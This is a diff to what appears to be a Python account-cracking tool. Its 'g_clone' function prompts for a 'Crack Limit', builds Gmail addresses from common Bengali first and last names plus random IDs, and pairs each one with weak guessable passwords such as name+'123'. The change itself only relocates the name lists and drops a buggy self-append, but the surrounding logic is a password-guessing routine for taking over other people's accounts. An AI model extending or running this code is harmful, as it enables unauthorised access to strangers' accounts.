@@ -932,18 +932,10 @@ def n_clone():
 
 def g_clone():
     user = []  # List to store random user IDs
-    first = []
-    last = []
     os.system('clear')  # Clear the terminal screen
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-    first = ['sumon', 'abinash', 'rakesh', 'riya', 'ramesh', 'somnath']
-    first.append(first)
-    last = ['roy', 'das', 'sarkar', 'mondal']
-    last.append(last)
     domain = '@gmail.com'
-    
     try:
         limit = int(input(' [:] Crack Limit : '))
     except ValueError:
@@ -989,6 +981,8 @@ def g_clone():
         
         # Use zip_longest to iterate over user, first, and last
         from itertools import zip_longest
+        first = ['sumon', 'abinash', 'rakesh', 'riya', 'ramesh', 'somnath']
+        last = ['roy', 'das', 'sarkar', 'mondal']
         for love, firs, las in zip_longest(user, first, last):
             uid = firs + las + love + domain
             pwx = [firs + las, firs + '12', firs + '123', firs + '1234', firs + '12345']
